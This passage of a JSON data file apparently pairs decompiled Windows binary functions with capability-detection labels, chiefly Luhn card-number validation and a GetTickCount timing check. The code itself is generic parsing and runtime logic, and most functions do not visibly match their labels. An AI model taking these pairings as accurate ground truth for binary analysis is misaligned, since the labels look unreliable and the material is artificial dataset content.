        "decompiled_code": "\nint32_t fcn.1400048a0(int64_t arg1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    bool bVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    \n    pcVar2 = *(arg1 + 0x18);\n    cVar1 = *pcVar2;\n    if (cVar1 == 'n') {\n        pcVar5 = pcVar2 + 1;\n        *(arg1 + 0x18) = pcVar5;\n        cVar1 = pcVar2[1];\n        if (9 < cVar1 - 0x30U) {\n            return 0;\n        }\n        bVar3 = true;\n    }\n    else {\n        if (9 < cVar1 - 0x30U) {\n            return 0;\n        }\n        bVar3 = false;\n        pcVar5 = pcVar2;\n    }\n    iVar6 = 0;\n    iVar4 = cVar1 + -0x30;\n    do {\n        pcVar5 = pcVar5 + 1;\n        *(arg1 + 0x18) = pcVar5;\n        iVar6 = iVar4 + iVar6 * 10;\n        if (9 < *pcVar5 - 0x30U) {\n            if (bVar3) {\n                iVar6 = -iVar6;\n            }\n            return iVar6;\n        }\n        iVar4 = *pcVar5 - 0x30U;\n    } while (iVar6 <= (0x7fffffffU - iVar4) / 10);\n    return -1;\n}\n",
        "token_count": 356
    },
    "140006a2": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00014000476e)\n// WARNING: Removing unreachable block (ram,0x0001400047b0)\n// WARNING: Removing unreachable block (ram,0x000140004751)\n// WARNING: Removing unreachable block (ram,0x000140004800)\n// WARNING: Removing unreachable block (ram,0x000140004813)\n// WARNING: Removing unreachable block (ram,0x0001400047b8)\n// WARNING: Removing unreachable block (ram,0x0001400047c7)\n// WARNING: Removing unreachable block (ram,0x00014000481f)\n// WARNING: Removing unreachable block (ram,0x0001400047ce)\n// WARNING: Removing unreachable block (ram,0x000140004824)\n// WARNING: Removing unreachable block (ram,0x00014000482d)\n// WARNING: Removing unreachable block (ram,0x000140004773)\n// WARNING: Removing unreachable block (ram,0x000140004778)\n// WARNING: Removing unreachable block (ram,0x000140004782)\n// WARNING: Removing unreachable block (ram,0x0001400047d5)\n// WARNING: Removing unreachable block (ram,0x0001400047d7)\n\nulong fcn.140006a20(int64_t arg1)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    int64_t iStack32;\n    \n    uVar1 = *(arg1 + 0x40);\n    if (**(arg1 + 0x18) == 'E') {\n        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n    // WARNING: Could not recover jumptable at 0x0001400047f6. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar1 = (*(*0x1400fef38 + 0x1400fef20))();\n        return uVar1;\n    }\n    iStack32 = 0;\n    piVar3 = &iStack32;\n    while( true ) {\n        iVar2 = fcn.140006980(arg1);\n        if (iVar2 == 0) {\n            return 0;\n        }\n        iVar2 = fcn.140004740(arg1, 0x2f, iVar2, 0);\n        *piVar3 = iVar2;\n        if (iVar2 == 0) break;\n        piVar3 = iVar2 + 0x18;\n        if (**(arg1 + 0x18) == 'E') {\n            *(arg1 + 0x40) = uVar1;\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n            return iStack32;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 623
    },
    "140006ad": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nint64_t fcn.140006ad0(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t arg3;\n    char *pcVar3;\n    char *pcVar4;\n    char cVar5;\n    ulong arg2_00;\n    \n    cVar5 = **(arg1 + 0x18);\n    if (cVar5 == '\\0') {\ncode_r0x000140006b68:\n        arg3 = 0;\ncode_r0x000140006b6a:\n        return arg3;\n    }\n    arg3 = 0;\n    pcVar3 = *(arg1 + 0x18);\n    do {\n    // switch table (75 cases) at 0x1400ff268\n        switch(cVar5) {\n        case '0':\n        case '1':\n        case '2':\n        case '3':\n        case '4':\n        case '5':\n        case '6':\n        case '7':\n        case '8':\n        case '9':\n        case 'C':\n        case 'L':\n        case 'U':\n        case 'a':\n        case 'b':\n        case 'c':\n        case 'd':\n        case 'e':\n        case 'f':\n        case 'g':\n        case 'h':\n        case 'i':\n        case 'j':\n        case 'k':\n        case 'l':\n        case 'm':\n        case 'n':\n        case 'o':\n        case 'p':\n        case 'q':\n        case 'r':\n        case 's':\n        case 't':\n        case 'u':\n        case 'v':\n        case 'w':\n        case 'x':\n        case 'y':\n        case 'z':\n            iVar2 = fcn.140006290(arg1);\n            if (arg3 != 0) {\n                iVar2 = fcn.140004740(arg1, 1, arg3, iVar2);\n            }\n            break;\n        default:\n            goto code_r0x000140006b68;\n        case 'D':\n            if ((pcVar3[1] & 0xdfU) != 0x54) {\n                iVar2 = fcn.140006290(arg1);\n                goto joined_r0x000140006b1e;\n            }\n            iVar2 = fcn.140005410(arg1);\n            if (arg3 == 0) break;\ncode_r0x000140006bd3:\n            arg2_00 = 1;\n            goto code_r0x000140006bd8;\n        case 'E':\n            goto code_r0x000140006b6a;\n        case 'I':\n            if (arg3 == 0) goto code_r0x000140006b68;\n            *(arg1 + 0x18) = pcVar3 + 1;\n            iVar2 = fcn.140006a20(arg1);\n            arg2_00 = 4;\ncode_r0x000140006bd8:\n            iVar2 = fcn.140004740(arg1, arg2_00, arg3, iVar2);\n            break;\n        case 'M':\n            if (arg3 != 0) {\n                pcVar4 = pcVar3 + 1;\n                *(arg1 + 0x18) = pcVar4;\n                cVar5 = pcVar3[1];\n                goto code_r0x000140006b60;\n            }\n            goto code_r0x000140006b68;\n        case 'S':\n            iVar2 = fcn.1400051c0(arg1, 1);\n            if (arg3 == 0) {\n                pcVar4 = *(arg1 + 0x18);\n                cVar5 = *pcVar4;\n                arg3 = iVar2;\n            }\n            else {\n                arg3 = fcn.140004740(arg1, 1, arg3, iVar2);\n                pcVar4 = *(arg1 + 0x18);\n                cVar5 = *pcVar4;\n            }\n            goto code_r0x000140006b60;\n        case 'T':\n            iVar2 = fcn.140004f80(arg1);\njoined_r0x000140006b1e:\n            if (arg3 != 0) goto code_r0x000140006bd3;\n        }\n        pcVar4 = *(arg1 + 0x18);\n        cVar5 = *pcVar4;\n        arg3 = iVar2;\n        if ((cVar5 != 'E') && ((arg2 & 1) != 0)) {\n            if ((iVar2 == 0) || (iVar1 = *(arg1 + 0x38),  *(arg1 + 0x3c) <= iVar1)) goto code_r0x000140006b68;\n            *(*(arg1 + 0x30) + iVar1 * 8) = iVar2;\n            *(arg1 + 0x38) = iVar1 + 1;\n            cVar5 = *pcVar4;\n        }\ncode_r0x000140006b60:\n        pcVar3 = pcVar4;\n        if (cVar5 == '\\0') goto code_r0x000140006b68;\n    } while( true );\n}\n",
        "token_count": 1132
    },
    "14000fb2": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint fcn.14000fb20(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uint uVar1;\n    \n    fcn.140017e10(arg1);\n    uVar1 = fcn.140013a70(0x6000, arg1, 0, arg2);\n    fcn.140017e80(arg1);\n    return uVar1;\n}\n",
        "token_count": 86
    },
    "14000fbd": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.14000fbd0(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.140013a70(0x4000, arg1, 0, arg2);\n    *(arg1 + iVar1) = 0;\n    return;\n}\n",
        "token_count": 75
    },
    "140012cd": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid fcn.140012cd0(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    ulong *puVar4;\n    int64_t *arg1_00;\n    uint64_t arg2;\n    uchar *puVar5;\n    uchar *puVar6;\n    ulong auStack96 [5];\n    uchar auStack56 [6];\n    uint16_t uStack50;\n    ulong uStack48;\n    ulong var_8h;\n    \n    if (*(arg1 + 0x14) == -3) {\n        uStack48 = 0;\n        auStack96[0] = 0x140012dd1;\n        puVar4 = sub.msvcrt.dll_localeconv();\n        arg1_00 = &stack0xffffffffffffffce;\n        auStack96[0] = 0x140012de6;\n        iVar1 = fcn.140018310(arg1_00, *puVar4, 0x10, &stack0xffffffffffffffd0);\n        if (iVar1 < 1) {\n            uStack50 = *(arg1 + 3);\n        }\n        else {\n            *(arg1 + 3) = uStack50;\n        }\n        *(arg1 + 0x14) = iVar1;\n    }\n    else {\n        uStack50 = *(arg1 + 3);\n        arg1_00 = arg1;\n    }\n    arg2 = uStack50;\n    if (uStack50 == 0) {\n        auStack96[0] = 0x140012dad;\n        fcn.140012060(0x2e, arg1);\n        return;\n    }\n    auStack96[0] = 0x140012d0d;\n    iVar3 = fcn.14000e880(arg1_00);\n    iVar3 = -iVar3;\n    uStack48 = 0;\n    *(&stack0xffffffffffffffa0 + iVar3) = 0x140012d29;\n    iVar1 = fcn.140018070(&stack0xffffffffffffffc8 + iVar3, arg2);\n    if (iVar1 < 1) {\n        *(&stack0xffffffffffffffa0 + iVar3) = 0x140012e0d;\n        fcn.140012060(0x2e, arg1);\n    }\n    else {\n        puVar5 = &stack0xffffffffffffffc8 + iVar3;\n        do {\n            while( true ) {\n                puVar6 = puVar5 + 1;\n                if (((*(arg1 + 1) & 0x4000) != 0) ||\n                   (iVar2 = *(arg1 + 0x24),  *(arg1 + 5) != iVar2 && iVar2 <= *(arg1 + 5))) break;\ncode_r0x000140012d4a:\n                *(arg1 + 0x24) = iVar2 + 1;\n                puVar5 = puVar6;\n                if (&stack0xffffffffffffffc9 + (iVar1 - 1) + iVar3 == puVar6) {\n                    return;\n                }\n            }\n            if ((*(arg1 + 1) & 0x2000) == 0) {\n                *(*arg1 + *(arg1 + 0x24)) = *puVar5;\n                iVar2 = *(arg1 + 0x24);\n                goto code_r0x000140012d4a;\n            }\n            *(&stack0xffffffffffffffa0 + iVar3) = 0x140012d7d;\n            sub.msvcrt.dll_fputc();\n            *(arg1 + 0x24) = *(arg1 + 0x24) + 1;\n            puVar5 = puVar6;\n        } while (&stack0xffffffffffffffc9 + (iVar1 - 1) + iVar3 != puVar6);\n    }\n    return;\n}\n",
        "token_count": 867
    },
    "140017ac": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nint64_t fcn.140017ac0(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int64_t arg1_00;\n    uint64_t arg1_01;\n    char *pcVar6;\n    char *pcVar7;\n    int32_t in_stack_00000028;\n    \n    iVar2 = (arg3 + 8) / 9;\n    if (arg3 < 10) {\n        arg1_01 = 0;\n    }\n    else {\n        arg1_01 = 0;\n        iVar5 = 1;\n        do {\n            iVar4 = iVar5 * 2;\n            arg1_01 = arg1_01 + 1;\n            iVar3 = iVar5 * -2;\n            iVar5 = iVar4;\n        } while (iVar2 != iVar4 && SBORROW4(iVar2, iVar4) == iVar2 + iVar3 < 0);\n    }\n    arg1_00 = fcn.140016f80(arg1_01);\n    *(arg1_00 + 0x18) = arg4;\n    *(arg1_00 + 0x14) = 1;\n    if (arg2 < 10) {\n        pcVar6 = arg1 + 9;\n        arg2._0_4_ = 9;\n    }\n    else {\n        pcVar6 = arg1 + 9;\n        do {\n            cVar1 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n            arg1_00 = fcn.1400170e0(arg1_00, 10, cVar1 - 0x30);\n        } while (pcVar6 != arg1 + arg2);\n    }\n    pcVar6 = pcVar6 + in_stack_00000028;\n    if (arg2 < arg3) {\n        pcVar7 = pcVar6 + (arg3 - arg2);\n        do {\n            cVar1 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n            arg1_00 = fcn.1400170e0(arg1_00, 10, cVar1 - 0x30);\n        } while (pcVar6 != pcVar7);\n    }\n    return arg1_00;\n}\n",
        "token_count": 531
    },
    "14001807": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nint64_t fcn.140018070(uchar *arg1, uint64_t arg2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uchar auStack29 [5];\n    \n    if (arg1 == NULL) {\n        arg1 = auStack29;\n    }\n    uVar1 = sub.msvcrt.dll____mb_cur_max_func();\n    uVar2 = sub.msvcrt.dll____lc_codepage_func();\n    iVar3 = fcn.140017fe0(arg1, arg2 & 0xffff, uVar2, uVar1);\n    return iVar3;\n}\n",
        "token_count": 141
    },
    "1400194a": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.1400194a0(int64_t *arg1, int64_t *arg2, ulong *arg3)\n\n{\n    char cVar1;\n    ulong *puStack32;\n    \n    puStack32 = *arg3;\n    cVar1 = (**(*arg2 + 0x10))(arg2);\n    if (cVar1 != '\\0') {\n        puStack32 = *puStack32;\n    }\n    cVar1 = (**(*arg1 + 0x20))(arg1, arg2, &puStack32, 1);\n    if (cVar1 != '\\0') {\n        *arg3 = puStack32;\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "14002cd9": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t ** fcn.14002cd90(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t **arg4)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    bool bVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int64_t *piVar7;\n    int64_t *piVar8;\n    uint64_t uVar9;\n    int64_t *piVar10;\n    int32_t iVar11;\n    uint64_t uVar12;\n    bool bVar13;\n    uint32_t uVar14;\n    bool bVar15;\n    bool bVar16;\n    int32_t *in_stack_00000028;\n    int32_t in_stack_00000030;\n    int32_t in_stack_00000038;\n    uint64_t in_stack_00000040;\n    int64_t in_stack_00000048;\n    uint32_t *in_stack_00000050;\n    \n    piVar1 = arg3[1];\n    piVar2 = arg4[1];\n    piVar10 = *arg4;\n    uVar9 = piVar1 & 0xffffffff;\n    piVar8 = *arg3;\n    piVar7 = fcn.1400b36a0(in_stack_00000048 + 0xd0);\n    bVar15 = piVar2 == -1;\n    iVar11 = 0;\n    uVar12 = 0;\n    while( true ) {\n        uVar6 = uVar9;\n        bVar16 = uVar6 == 0xffffffff;\n        bVar13 = piVar8 != NULL && bVar16;\n        bVar3 = bVar16;\n        if (bVar13) {\n            if (piVar8[2] < piVar8[3]) {\n                bVar3 = false;\n            }\n            else {\n                iVar5 = (**(*piVar8 + 0x48))(piVar8);\n                if (iVar5 == -1) {\n                    piVar8 = NULL;\n                }\n                bVar3 = iVar5 == -1 && bVar13;\n            }\n        }\n        if ((piVar10 == NULL) || (!bVar15)) {\n            bVar3 = bVar3 ^ bVar15;\n        }\n        else if ((piVar10[3] <= piVar10[2]) && (iVar5 = (**(*piVar10 + 0x48))(piVar10),  iVar5 == -1)) {\n            bVar3 = bVar3 ^ 1;\n            piVar10 = NULL;\n        }\n        if ((in_stack_00000040 <= uVar12) || (!bVar3)) break;\n        if ((piVar8 == NULL) || (!bVar16)) {\n            uVar14 = uVar6 & 0xff;\n        }\n        else if (piVar8[2] < piVar8[3]) {\n            uVar6 = *piVar8[2];\n            uVar14 = uVar6;\n        }\n        else {\n            uVar6 = (**(*piVar8 + 0x48))(piVar8);\n            if (uVar6 == 0xffffffff) {\n                uVar14 = 0xff;\n                uVar6 = 0xffffffff;\n                piVar8 = NULL;\n            }\n            else {\n                uVar14 = uVar6 & 0xff;\n            }\n        }\n        cVar4 = *(piVar7 + uVar14 + 0x139);\n        if (cVar4 == '\\0') {\n            cVar4 = uVar6;\n            if (*(*piVar7 + 0x40) != 0x140025c30) {\n                cVar4 = (**(*piVar7 + 0x40))(piVar7, uVar6, 0x2a);\n            }\n            if (cVar4 == '*') break;\n            *(piVar7 + uVar14 + 0x139) = cVar4;\n        }\n        if (9 < cVar4 - 0x30U) break;\n        iVar11 = (cVar4 - 0x30U) + iVar11 * 10;\n        if (in_stack_00000038 < iVar11) goto code_r0x00014002cedf;\n        if (piVar8[2] < piVar8[3]) {\n            piVar8[2] = piVar8[2] + 1;\n        }\n        else {\n            (**(*piVar8 + 0x50))(piVar8);\n        }\n        uVar12 = uVar12 + 1;\n        uVar9 = 0xffffffff;\n    }\n    if ((uVar12 != 0 && in_stack_00000030 <= iVar11) && (iVar11 <= in_stack_00000038)) {\n        *in_stack_00000028 = iVar11;\n        goto code_r0x00014002ceea;\n    }\ncode_r0x00014002cedf:\n    *in_stack_00000050 = *in_stack_00000050 | 4;\ncode_r0x00014002ceea:\n    arg1[1] = piVar1 & 0xffffffff00000000 | uVar9;\n    *arg1 = piVar8;\n    return arg1;\n}\n",
        "token_count": 1160
    },
    "140032a4": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.140032a40(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t **arg4)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    char cVar3;\n    int16_t iVar4;\n    int64_t *piVar5;\n    bool bVar6;\n    uint64_t uVar7;\n    int32_t iVar8;\n    int64_t *piVar9;\n    int64_t *piVar10;\n    uint64_t uVar11;\n    bool bVar12;\n    bool bVar13;\n    bool bVar14;\n    int32_t *in_stack_00000028;\n    int32_t in_stack_00000030;\n    int32_t in_stack_00000038;\n    uint64_t in_stack_00000040;\n    int64_t in_stack_00000048;\n    uint32_t *in_stack_00000050;\n    \n    piVar1 = arg4[1];\n    piVar2 = arg3[1];\n    piVar9 = *arg3;\n    piVar10 = *arg4;\n    piVar5 = fcn.1400b3700(in_stack_00000048 + 0xd0);\n    bVar12 = piVar1 == -1;\n    uVar11 = piVar2 & 0xffffffff;\n    uVar7 = 0;\n    iVar8 = 0;\n    while( true ) {\n        bVar13 = uVar11 == -1;\n        bVar14 = piVar9 != NULL;\n        if (bVar14 && bVar13) break;\n        bVar14 = bVar13;\n        if (piVar10 == NULL || !bVar12) goto code_r0x000140032ac2;\ncode_r0x000140032b90:\n        bVar6 = piVar10 != NULL;\n        if (piVar10[2] < piVar10[3]) {\n            iVar4 = *piVar10[2];\n        }\n        else {\n            iVar4 = (**(*piVar10 + 0x48))(piVar10);\n        }\n        if (iVar4 == -1) {\n            piVar10 = NULL;\n        }\n        bVar6 = iVar4 == -1 && (bVar6 && bVar12);\n        if (in_stack_00000040 <= uVar7) goto code_r0x000140032bc0;\ncode_r0x000140032ace:\n        if (bVar14 == bVar6) goto code_r0x000140032bc0;\n        if ((piVar9 != NULL) && (bVar13)) {\n            if (piVar9[2] < piVar9[3]) {\n                iVar4 = *piVar9[2];\n            }\n            else {\n                iVar4 = (**(*piVar9 + 0x48))(piVar9);\n            }\n            if (iVar4 == -1) {\n                piVar9 = NULL;\n            }\n        }\n        cVar3 = (**(*piVar5 + 0x60))(piVar5);\n        if (9 < cVar3 - 0x30U) goto code_r0x000140032bc0;\n        iVar8 = (cVar3 - 0x30U) + iVar8 * 10;\n        if (in_stack_00000038 < iVar8) goto code_r0x000140032bea;\n        if (piVar9[2] < piVar9[3]) {\n            piVar9[2] = piVar9[2] + 2;\n        }\n        else {\n            (**(*piVar9 + 0x50))(piVar9);\n        }\n        uVar7 = uVar7 + 1;\n        uVar11 = 0xffffffff;\n    }\n    if (piVar9[2] < piVar9[3]) {\n        iVar4 = *piVar9[2];\n    }\n    else {\n        iVar4 = (**(*piVar9 + 0x48))(piVar9);\n    }\n    if (iVar4 == -1) {\n        piVar9 = NULL;\n    }\n    bVar14 = iVar4 == -1 && (bVar14 && bVar13);\n    if (piVar10 != NULL && bVar12) goto code_r0x000140032b90;\ncode_r0x000140032ac2:\n    bVar6 = bVar12;\n    if (uVar7 < in_stack_00000040) goto code_r0x000140032ace;\ncode_r0x000140032bc0:\n    if ((uVar7 != 0 && in_stack_00000030 <= iVar8) && (iVar8 <= in_stack_00000038)) {\n        *in_stack_00000028 = iVar8;\n        goto code_r0x000140032bf5;\n    }\ncode_r0x000140032bea:\n    *in_stack_00000050 = *in_stack_00000050 | 4;\ncode_r0x000140032bf5:\n    *arg1 = piVar9;\n    arg1[1] = piVar2 & 0xffffffffffff0000 | uVar11 & 0xffff;\n    return;\n}\n",
        "token_count": 1132
    },
    "14005801": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.140058010(ulong noname_0, ulong arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char in_R9B;\n    int64_t in_stack_00000028;\n    ulong in_stack_00000030;\n    int32_t in_stack_00000038;\n    int32_t *in_stack_00000040;\n    \n    if (in_stack_00000028 != 0) {\n        iVar3 = in_stack_00000028 - in_stack_00000038;\n        uVar1 = fcn.1400b0000(in_stack_00000030, in_R9B, arg2, arg3);\n        iVar2 = 0;\n        if (*in_stack_00000040 != iVar3) {\n            sub.msvcrt.dll_memcpy(uVar1);\n            iVar2 = *in_stack_00000040 - iVar3;\n        }\n        *in_stack_00000040 = iVar2 + (uVar1 - in_stack_00000030);\n        return;\n    }\n    iVar2 = fcn.1400b0000(in_stack_00000030, in_R9B, arg2, arg3);\n    *in_stack_00000040 = iVar2 - in_stack_00000030;\n    return;\n}\n",
        "token_count": 289
    },
    "14005bd6": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t ** fcn.14005bd60(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t **arg4)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    bool bVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int64_t *piVar7;\n    int64_t *piVar8;\n    uint64_t uVar9;\n    int64_t *piVar10;\n    int32_t iVar11;\n    uint64_t uVar12;\n    bool bVar13;\n    uint32_t uVar14;\n    bool bVar15;\n    bool bVar16;\n    int32_t *in_stack_00000028;\n    int32_t in_stack_00000030;\n    int32_t in_stack_00000038;\n    uint64_t in_stack_00000040;\n    int64_t in_stack_00000048;\n    uint32_t *in_stack_00000050;\n    \n    piVar1 = arg3[1];\n    piVar2 = arg4[1];\n    piVar10 = *arg4;\n    uVar9 = piVar1 & 0xffffffff;\n    piVar8 = *arg3;\n    piVar7 = fcn.1400b36a0(in_stack_00000048 + 0xd0);\n    bVar15 = piVar2 == -1;\n    iVar11 = 0;\n    uVar12 = 0;\n    while( true ) {\n        uVar6 = uVar9;\n        bVar16 = uVar6 == 0xffffffff;\n        bVar13 = piVar8 != NULL && bVar16;\n        bVar3 = bVar16;\n        if (bVar13) {\n            if (piVar8[2] < piVar8[3]) {\n                bVar3 = false;\n            }\n            else {\n                iVar5 = (**(*piVar8 + 0x48))(piVar8);\n                if (iVar5 == -1) {\n                    piVar8 = NULL;\n                }\n                bVar3 = iVar5 == -1 && bVar13;\n            }\n        }\n        if ((piVar10 == NULL) || (!bVar15)) {\n            bVar3 = bVar3 ^ bVar15;\n        }\n        else if ((piVar10[3] <= piVar10[2]) && (iVar5 = (**(*piVar10 + 0x48))(piVar10),  iVar5 == -1)) {\n            bVar3 = bVar3 ^ 1;\n            piVar10 = NULL;\n        }\n        if ((in_stack_00000040 <= uVar12) || (!bVar3)) break;\n        if ((piVar8 == NULL) || (!bVar16)) {\n            uVar14 = uVar6 & 0xff;\n        }\n        else if (piVar8[2] < piVar8[3]) {\n            uVar6 = *piVar8[2];\n            uVar14 = uVar6;\n        }\n        else {\n            uVar6 = (**(*piVar8 + 0x48))(piVar8);\n            if (uVar6 == 0xffffffff) {\n                uVar14 = 0xff;\n                uVar6 = 0xffffffff;\n                piVar8 = NULL;\n            }\n            else {\n                uVar14 = uVar6 & 0xff;\n            }\n        }\n        cVar4 = *(piVar7 + uVar14 + 0x139);\n        if (cVar4 == '\\0') {\n            cVar4 = uVar6;\n            if (*(*piVar7 + 0x40) != 0x140025c30) {\n                cVar4 = (**(*piVar7 + 0x40))(piVar7, uVar6, 0x2a);\n            }\n            if (cVar4 == '*') break;\n            *(piVar7 + uVar14 + 0x139) = cVar4;\n        }\n        if (9 < cVar4 - 0x30U) break;\n        iVar11 = (cVar4 - 0x30U) + iVar11 * 10;\n        if (in_stack_00000038 < iVar11) goto code_r0x00014005beaf;\n        if (piVar8[2] < piVar8[3]) {\n            piVar8[2] = piVar8[2] + 1;\n        }\n        else {\n            (**(*piVar8 + 0x50))(piVar8);\n        }\n        uVar12 = uVar12 + 1;\n        uVar9 = 0xffffffff;\n    }\n    if ((uVar12 != 0 && in_stack_00000030 <= iVar11) && (iVar11 <= in_stack_00000038)) {\n        *in_stack_00000028 = iVar11;\n        goto code_r0x00014005beba;\n    }\ncode_r0x00014005beaf:\n    *in_stack_00000050 = *in_stack_00000050 | 4;\ncode_r0x00014005beba:\n    arg1[1] = piVar1 & 0xffffffff00000000 | uVar9;\n    *arg1 = piVar8;\n    return arg1;\n}\n",
        "token_count": 1160
    },
    "14006095": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.140060950(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t **arg4)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    char cVar3;\n    int16_t iVar4;\n    int64_t *piVar5;\n    bool bVar6;\n    uint64_t uVar7;\n    int32_t iVar8;\n    int64_t *piVar9;\n    int64_t *piVar10;\n    uint64_t uVar11;\n    bool bVar12;\n    bool bVar13;\n    bool bVar14;\n    int32_t *in_stack_00000028;\n    int32_t in_stack_00000030;\n    int32_t in_stack_00000038;\n    uint64_t in_stack_00000040;\n    int64_t in_stack_00000048;\n    uint32_t *in_stack_00000050;\n    \n    piVar1 = arg4[1];\n    piVar2 = arg3[1];\n    piVar9 = *arg3;\n    piVar10 = *arg4;\n    piVar5 = fcn.1400b3700(in_stack_00000048 + 0xd0);\n    bVar12 = piVar1 == -1;\n    uVar11 = piVar2 & 0xffffffff;\n    uVar7 = 0;\n    iVar8 = 0;\n    while( true ) {\n        bVar13 = uVar11 == -1;\n        bVar14 = piVar9 != NULL;\n        if (bVar14 && bVar13) break;\n        bVar14 = bVar13;\n        if (piVar10 == NULL || !bVar12) goto code_r0x0001400609d2;\ncode_r0x000140060aa0:\n        bVar6 = piVar10 != NULL;\n        if (piVar10[2] < piVar10[3]) {\n            iVar4 = *piVar10[2];\n        }\n        else {\n            iVar4 = (**(*piVar10 + 0x48))(piVar10);\n        }\n        if (iVar4 == -1) {\n            piVar10 = NULL;\n        }\n        bVar6 = iVar4 == -1 && (bVar6 && bVar12);\n        if (in_stack_00000040 <= uVar7) goto code_r0x000140060ad0;\ncode_r0x0001400609de:\n        if (bVar14 == bVar6) goto code_r0x000140060ad0;\n        if ((piVar9 != NULL) && (bVar13)) {\n            if (piVar9[2] < piVar9[3]) {\n                iVar4 = *piVar9[2];\n            }\n            else {\n                iVar4 = (**(*piVar9 + 0x48))(piVar9);\n            }\n            if (iVar4 == -1) {\n                piVar9 = NULL;\n            }\n        }\n        cVar3 = (**(*piVar5 + 0x60))(piVar5);\n        if (9 < cVar3 - 0x30U) goto code_r0x000140060ad0;\n        iVar8 = (cVar3 - 0x30U) + iVar8 * 10;\n        if (in_stack_00000038 < iVar8) goto code_r0x000140060afa;\n        if (piVar9[2] < piVar9[3]) {\n            piVar9[2] = piVar9[2] + 2;\n        }\n        else {\n            (**(*piVar9 + 0x50))(piVar9);\n        }\n        uVar7 = uVar7 + 1;\n        uVar11 = 